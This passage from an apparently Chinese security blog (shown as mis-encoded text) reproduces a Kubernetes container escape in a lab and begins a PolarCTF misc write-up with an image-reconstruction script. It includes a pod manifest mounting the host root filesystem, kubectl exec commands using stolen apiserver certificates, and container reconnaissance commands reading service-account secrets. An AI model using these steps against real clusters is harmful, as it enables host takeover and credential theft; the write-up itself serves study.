title="k8sé€ƒé€¸"></a>k8sé€ƒé€¸</h6><p>æœ‰äº†apiserverçš„æƒé™å°±å¯ä»¥é€ƒé€¸äº†ï¼Œä¸»è¦æ€è·¯å°±æ˜¯ï¼Œæœ‰äº†apiserveræƒé™ï¼Œå°±å¯ä»¥åˆ›å»ºpodsï¼Œåœ¨åˆ›å»ºçš„æ—¶å€™ï¼Œç›´æ¥æŠŠå®¿ä¸»ä¸»æœºçš„æ ¹ç›®å½•æ˜ å°„å‡ºæ¥ã€‚ä¸‹é¢æ˜¯åˆ›å»ºpodsçš„å†…å®¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#æ¨èæŠŠé‚£ä¸ªé•œåƒæ¢æ‰ï¼Œè¿™é‡Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆæ‹‰å»ä¸åˆ°å•Š</span><br><span class="line"># attacker.yaml</span><br><span class="line">apiVersion: v1</span><br><span class="line">kind: Pod</span><br><span class="line">metadata:</span><br><span class="line">  name: attacker</span><br><span class="line">spec:</span><br><span class="line">  containers:</span><br><span class="line">  - name: ubuntu</span><br><span class="line">#    image: ubuntu:latest</span><br><span class="line">image: nginx:1.14.2</span><br><span class="line">    imagePullPolicy: IfNotPresent</span><br><span class="line">    # Just spin &amp; wait forever</span><br><span class="line">    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]</span><br><span class="line">    args: [ &quot;while true; do sleep 30; done;&quot; ]</span><br><span class="line">    volumeMounts:</span><br><span class="line">    - name: escape-host</span><br><span class="line">      mountPath: /host-escape-door</span><br><span class="line">  volumes:</span><br><span class="line">    - name: escape-host</span><br><span class="line">      hostPath:</span><br><span class="line">        path: /</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240105161604796.png" alt="image-20240105161604796"></p><p>æ‰“çš„æ—¶å€™ä¸€å®šè¦æŠŠè·¯å¾„å¯¹é½ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker id</span><br><span class="line"></span><br><span class="line">kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker sh</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240105162100408.png" alt="image-20240105162100408"></p><p><code>kubectl --server=https://ip:6443 --certificate-authority=ca.crt --client-certificate=apiserver-kubelet-client.crt --client-key=apiserver-kubelet-client.key --namespace=default exec -it attacker id</code></p><p><img src="/images/k8s/image-20240105163047960.png" alt="image-20240105163047960"></p><p>é¶æœºä¸Šçœ‹ä¸€çœ¼</p><p><img src="/images/k8s/image-20240105163129394.png" alt="image-20240105163129394"></p><p>å‚è€ƒ<code>https://teamssix.com/220324-161756.html#toc-heading-1</code><br>å› ä¸ºè¿™é‡Œè¿˜æ˜¯è¿˜æ˜¯</p><h6 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h6><p>è¿™é‡Œå…¶å®å¯æ€è€ƒï¼Œåœ¨å®æˆ˜ä¸­å¯èƒ½å‡ºç°è¿™ç§æƒ…å†µçš„æ¦‚ç‡éå¸¸å°ï¼Œåœ¨k8s1.11ç‰ˆæœ¬å‘è¡Œçš„æ—¶é—´ä¸º2018å¹´ï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨è¿™ä¹‹åçš„éƒ½ä¸å¯ä»¥äº†ï¼Œ2018å¹´è·ä»Šå·²ç»6å¹´äº†ï¼Œè¿˜æœ‰ä¸€ä¸ªæ¡ä»¶å°±æ˜¯ï¼Œè¦æå‰è·å–åˆ°ä¸€ä¸ªpodsçš„ä½æ‰§è¡Œæƒé™ï¼Œä»æ‰èƒ½ä¸‹è½½åˆ°ä¸‰ä¸ªè¯ä¹¦æ–‡ä»¶ã€‚</p><h5 id="å®æˆ˜ä¸­çš„ä¸€äº›å‘½ä»¤"><a href="#å®æˆ˜ä¸­çš„ä¸€äº›å‘½ä»¤" class="headerlink" title="å®æˆ˜ä¸­çš„ä¸€äº›å‘½ä»¤"></a>å®æˆ˜ä¸­çš„ä¸€äº›å‘½ä»¤</h5><p>æ€»ä½“çœ‹k8sçš„ä¸€äº›cveçš„æ¼æ´ï¼Œé™¤äº†é‚£å‡ ä¸ªæœªæˆæƒï¼Œåˆ©ç”¨æ¡ä»¶ä¼¼ä¹éƒ½æ¯”è¾ƒè‹›åˆ»ã€‚<br>åœ¨å®æˆ˜ä¸­ï¼ŒåŸºæœ¬ä¸Šæ˜¯å…ˆæ‹¿åˆ°ä¸€ä¸ªpodsçš„shellï¼Œç„¶ååœ¨è¿›è¡Œä¸€ç³»åˆ—çš„æ“ä½œæ¯”è¾ƒå¤šã€‚</p><p>å½“æˆ‘ä»¬è·å–äº†ä¸€ä¸ªå®¹å™¨çš„ shellï¼Œé¦–å…ˆæ‰§è¡Œ cat /proc/1/cgroup æ˜¯é‡è¦çš„ã€‚</p><p><img src="D:\myBlog\source_posts\k8så­¦ä¹ åŠæ¼æ´å¤ç°\image-20240110111406947.png" alt="image-20240110111406947"></p><p>å‡ºç°è¿™ä¸ªkubepodsï¼Œå°±æ˜¯ä½¿ç”¨k8sè¿›è¡Œç¼–æ’çš„ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">env | grep KUBE</span><br><span class="line">ls -l /run/secrets/kubernetes.io/</span><br><span class="line">df -h</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/mtab</span><br><span class="line">cat /proc/self/status</span><br><span class="line">cat /proc/self/mounts</span><br><span class="line">cat /proc/net/unix</span><br><span class="line">cat /proc/1/mountinfo</span><br></pre></td></tr></table></figure><p><img src="D:\myBlog\source_posts\k8så­¦ä¹ åŠæ¼æ´å¤ç°\image-20240110112309832.png" alt="image-20240110112309832"></p><p><code>æŸ¥çœ‹å½“å‰ç¯å¢ƒæ˜¯å¦ä¸ºå®¹å™¨ cat /proc/1/cgroupçœ‹å›æ˜¾ç»“æœä¸­æ˜¯å¦æœ‰dockerï¼ˆè¿™ä¸ªæ–¹æ³•ä¸€èˆ¬è¦æ¯”ls /.dockerenvè¦å‡†ç¡®ï¼Œå®æµ‹æœ‰äº›å®¹å™¨æ ¹ç›®å½•ä¸‹ç¡®å®æ²¡æœ‰.dockerenvï¼‰</code></p><h6 id="ç‰¹æƒæ¨¡å¼åˆ¤æ–­"><a href="#ç‰¹æƒæ¨¡å¼åˆ¤æ–­" class="headerlink" title="ç‰¹æƒæ¨¡å¼åˆ¤æ–­"></a>ç‰¹æƒæ¨¡å¼åˆ¤æ–­</h6><p>ç‰¹æƒæ¨¡å¼é€ƒé€¸æ˜¯ä¸€ç§æœ€ç®€å•æœ‰æ•ˆçš„é€ƒé€¸æ–¹æ³•ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡æŒ‚è½½å®¿ä¸»æœºç›®å½•åˆ°å®¹å™¨æŸä¸ªç›®å½•ä¸‹ï¼Œç›´æ¥é€šè¿‡å‘½ä»¤ã€å†™sshå…¬é’¥å’Œcrontabç­‰getshellã€‚</p><p>åˆ›å»ºå®¹å™¨æ—¶é€šè¿‡æ·»åŠ â€“privileged=trueå‚æ•°ï¼Œå°†å®¹å™¨ä»¥ç‰¹æƒæ¨¡å¼èµ·åŠ¨</p><p>ç‰¹æƒæ¨¡å¼èµ·çš„å®¹å™¨ï¼Œå®æˆ˜å¯é€šè¿‡cat /proc/self/status |grep Capå‘½ä»¤åˆ¤æ–­å½“å‰å®¹å™¨æ˜¯å¦é€šè¿‡ç‰¹æƒæ¨¡å¼èµ·ï¼ˆ0000001fffffffffä»£è¡¨ä¸ºç‰¹æƒæ¨¡å¼èµ·ï¼‰</p><p>ä¸æ˜¯</p><p><img src="D:\myBlog\source_posts\k8så­¦ä¹ åŠæ¼æ´å¤ç°\image-20240111172526199.png" alt="image-20240111172526199"></p><p>ç®€å•çš„åˆ¤æ–­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ç£ç›˜æŒ‚è½½å‘½ä»¤åˆ¤æ–­ã€‚<br>df -l ï¼Œmount</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰ä¸å‘¨åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬ç”¨å„ç§æ–¹å¼æŒ‡æ­£å‹˜è¯¯ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">K8s etcdæœªæˆæƒè®¿é—®    https://www.wangan.com/p/11v748294758597c</span><br><span class="line">æµ…è°ˆ Kubernetes å®‰å…¨é£é™© Part.1 http://wjlshare.com/archives/1744</span><br><span class="line">ã€äº‘å®‰å…¨ã€‘k8s ææƒæ¼æ´ CVE-2018-1002105 å­¦ä¹  https://teamssix.com/220324-161756.html#toc-heading-5</span><br><span class="line">https://woj.app/7776.html</span><br><span class="line">https://zone.huoxian.cn/d/1153-k8s</span><br><span class="line">https://mp.weixin.qq.com/s/NwyY0MYZRSywsUe-rGytjg</span><br><span class="line">https://www.cnblogs.com/haidragon/p/16843374.html</span><br><span class="line">åä¸ºäº‘CTF cloudéé¢„æœŸè§£ä¹‹k8sæ¸—é€å®æˆ˜   https://annevi.cn/2020/12/21/%e5%8d%8e%e4%b8%ba%e4%ba%91ctf-cloud%e9%9d%9e%e9%a2%84%e6%9c%9f%e8%a7%a3%e4%b9%8bk8s%e6%b8%97%e9%80%8f%e5%ae%9e%e6%88%98/</span><br><span class="line">https://blog.csdn.net/w1590191166/article/details/122028001</span><br><span class="line">kubernetes æŸ¥çœ‹æ‰€æœ‰namespaceã€é»˜è®¤çš„namespace https://blog.csdn.net/u013288190/article/details/109674360</span><br><span class="line">https://xz.aliyun.com/t/12921#toc-2</span><br><span class="line">k8sä¹‹apiserverç»„ä»¶é£é™© https://zone.huoxian.cn/u/48984</span><br><span class="line">https://tttang.com/archive/1389/#toc_api-server</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>polarctfwebåˆ·é¢˜è®°å½•</title>
      <link href="/2023/12/08/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/12/08/polarctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/polarctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="0å’Œ255"><a href="#0å’Œ255" class="headerlink" title="0å’Œ255"></a>0å’Œ255</h5><p>ç»™åˆ°ä¸€ä¸ªpyæ–‡ä»¶ï¼Œæ˜¯å›¾ç‰‡ç”Ÿæˆåæ ‡ç‚¹çš„ï¼Œä¹Ÿç»™äº†åæ ‡ç‚¹ï¼Œ<br>æ‰¾chatgpté—®ä¸€ä¸‹è¿˜åŸä¸€ä¸‹ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¾“å…¥åæ ‡ç‚¹åˆ—è¡¨</span></span><br><span class="line">image_list = [[<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>], [<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0</span>, <span 